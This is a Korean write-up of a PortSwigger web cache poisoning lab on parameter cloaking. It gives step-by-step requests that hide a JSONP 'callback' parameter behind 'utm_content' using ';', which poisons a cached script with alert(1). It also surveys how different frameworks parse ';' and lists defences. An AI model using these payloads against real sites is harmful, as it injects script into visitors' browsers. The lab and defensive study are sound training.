# Lab: Parameter cloaking

## 개요

- **난이도**: Practitioner
- **주제**: Web Cache Poisoning — Cache Parameter Cloaking / `;` 파라미터 구분자 파싱 불일치 / JSONP 콜백 조작
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking

## 목표

캐시와 백엔드의 파라미터 파싱이 다른 점(`;` 구분자)을 이용해, keyed 파라미터(`callback`)를 unkeyed 파라미터(`utm_content`) 뒤에 숨겨 캐시를 오염시키고 `alert(1)` 을 실행시킨다.

## 취약 지점

### 1. `utm_content` 가 캐시 키에서 제외됨(unkeyed)

```
GET /...?utm_content=foo
→ 이 파라미터는 캐시 키에 포함되지 않음
```

### 2. 캐시와 백엔드의 파싱 불일치 (핵심)

```
[캐시가 보는 것]
  utm_content=foo;callback=arbitraryFunction
  → 하나의 파라미터(utm_content)로 봄
  → 캐시 키에서 제외 (unkeyed)

[백엔드가 보는 것]
  ; 를 구분자로 파싱
  → utm_content=foo  AND  callback=arbitraryFunction
  → callback 이 실제 응답(JSONP 콜백)에 반영됨
```

즉, keyed 파라미터였던 `callback` 이 `utm_content` 에 "숨겨져" 캐시 키를 벗어난다.

### 3. 중복 파라미터는 마지막 값이 반영됨

```
?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
  캐시 키: callback=setCountryCookie (앞의 값만 keyed)
  백엔드: callback=arbitraryFunction (뒤의 값이 최종 반영)
```

## JSONP 콜백 조작

```
/js/geolocate.js?callback=setCountryCookie
→ 응답: setCountryCookie({"country" : "United Kingdom"})

callback 이름을 바꾸면 임의 함수 호출 가능
→ alert(1) 을 콜백 "이름" 으로 넣으면 실행됨
```

## 공격 단계

### 1단계 — unkeyed 파라미터 확인

`utm_content` 가 지원되고 캐시 키에서 제외됨을 확인한다.

### 2단계 — `;` 클로킹 확인

`utm_content` 에 `;` 로 다른 파라미터를 붙이면 캐시는 한 파라미터로 취급한다.

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
```

응답 헤더의 `X-Cache-Key: /js/geolocate.js?callback=setCountryCookie` 로
`callback` 이 키에 남아 있고, 응답 본문은 `arbitraryFunction(...)` 을 호출함을 확인한다.

```http
HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
...
arbitraryFunction({"country" : "United Kingdom"})
```

### 3단계 — 악성 콜백 주입

콜백 함수 자리에 `alert(1)` 을 넣는다.

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

### 4단계 — 캐시 오염

응답이 캐시될 때까지 재전송한 뒤, 홈 페이지를 브라우저로 열어 `alert()` 발생을 확인한다.

```
홈 페이지가 /js/geolocate.js 를 임포트 → 오염된 응답 로드 → alert(1)
```

### 5단계 — 유지

피해자가 페이지를 방문할 때까지 재전송으로 캐시를 계속 오염 상태로 유지한다.

## `;` 파라미터 구분자 — 프레임워크/WAS/캐시 조사

캐시 오염 parameter cloaking 은 "백엔드는 `;` 를 구분자로, 캐시는 그렇게 보지 않음" 에서 발생한다.

| 스택 | 쿼리에서 `;` 를 구분자로? | 비고 |
|------|--------------------------|------|
| **Rack / Rails (Ruby)** | 과거 O (Rack 2.2.3 이전), 이후 기본 `&` 만 | 고전적 클로킹 대상. Param Miner 의 "Rails parameter cloaking scan" 이 겨냥 |
| **PHP** | 설정에 따라 O | `arg_separator.input` 에 `;` 포함 시 `&` 와 동일 취급 (기본값은 `&`) |
| **Java Servlet / Tomcat** | 쿼리는 원칙적으로 `&` | 단, 경로에서 `;` 는 matrix path parameter(`;jsessionid=`)로 처리 → 경로 파싱 불일치 유발 |
| **Java (Spring Security)** | 경로 매칭에서 `;` 무시/제거 옵션 | URL 매칭 불일치로 보호 우회 가능 |
| **Python (Django/Werkzeug/Flask)** | 기본 `&` (`parse_qs` sep=`&`) | 일부 서드파티 파서는 다를 수 있음 |
| **Node.js (querystring / qs / Express)** | 기본 `&` | 커스텀 파서/미들웨어에 따라 다를 수 있음 |
| **Go net/url** | `&` | |
| **ASP.NET** | `&` | |
| **일부 CDN/캐시 (Varnish/Squid/벤더)** | 캐시 키 생성 시 파싱 방식이 백엔드와 다를 수 있음 | 캐시 키에 전체 쿼리를 문자열로 넣는 경우 클로킹 성립 |

```
[일반 원칙]
  캐시가 파라미터를 "구조적으로" 파싱하지 않고
  쿼리 전체/특정 파라미터 문자열로 키를 만들면,
  백엔드의 구분자 해석과 어긋나 클로킹이 가능하다.

[주요 구분자/변형]
  ;  (semicolon)   ← 이 랩
  %3b             ; URL 인코딩 형태
  %26             & 인코딩 형태
  &amp;           HTML 엔티티
  중복 파라미터    (first-wins vs last-wins 차이)
```

### 점검 방법

```
1) Param Miner → "Bulk scan" > "Rails parameter cloaking scan"
2) 후보 unkeyed 파라미터(utm_* 등)에 ; 로 다른 파라미터를 붙여
   - X-Cache-Key 가 그 파라미터를 포함하지 않는지
   - 응답에는 그 파라미터가 반영되는지 확인
3) 중복 파라미터의 우선순위(first/last)도 함께 관찰
```

## 방어

```
[근본 원인]
  1) 응답에 영향을 주는 파라미터를 캐시 키에서 제외
  2) 캐시와 백엔드의 쿼리 파싱 규칙 불일치(;, 인코딩, 중복 처리)
  3) 캐시 키가 쿼리를 구조적으로 정규화하지 않음

[올바른 방어]
  1. 캐시 키 정규화
     - 쿼리를 표준 방식으로 파싱해 정렬/정규화 후 키 구성
     - 구분자(;, 인코딩), 중복 파라미터 처리 규칙을 백엔드와 일치
  2. 응답에 영향을 주는 파라미터를 키에 포함
     - 분석 파라미터라도 반영되면 키에 포함하거나 반영 제거
  3. 캐시/백엔드 파싱 일관성 검증 (동일 파서 사용 또는 명세 통일)
  4. 불필요 파라미터 무시 로직 제거 (조용히 버리지 않기)
  5. JSONP 콜백 등 사용자 제어 함수명 검증/허용목록
  6. CSP 로 인라인/외부 스크립트 실행 완화

[주의]
  "쿼리를 문자열로 그대로 키에 넣는다" 는 설계는
  백엔드의 파싱 규칙과 조금만 달라도 클로킹에 취약하다.
```

## 핵심 정리

- `utm_content`(unkeyed) 뒤에 `;` 로 `callback`(keyed)을 붙이면, 캐시는 하나의 unkeyed 파라미터로 보지만 백엔드는 `callback` 을 파싱해 응답에 반영했다.
- `callback=alert(1)` 로 JSONP 콜백을 조작해 `/js/geolocate.js` 응답을 오염시켜 홈 페이지에서 `alert(1)` 을 실행했다.
- 본질은 **캐시와 백엔드의 파라미터 파싱 불일치**이며, `;` 는 그 대표적 구분자다.
- Rack/Rails(과거), PHP(`arg_separator.input`), Java 경로 매트릭스 파라미터 등 스택별로 `;` 처리 차이를 점검해야 한다.

## 배운 점

- 006(개별 파라미터 unkeyed)의 심화형으로, 이번에는 **파싱 불일치**로 keyed 파라미터를 unkeyed 화했다.
- 파라미터 파싱 규칙(구분자·인코딩·중복)은 계층마다 다를 수 있고, 그 차이가 보안 경계를 무너뜨린다.
- `;`(세미콜론)는 쿼리 구분자로 쓰이는 스택이 있어 클로킹 단골이며, `%3b`·`%26`·중복 파라미터도 함께 실험해야 한다.
- 캐시 키를 문자열 수준이 아니라 구조적으로 정규화하는 것이 근본 방어다.
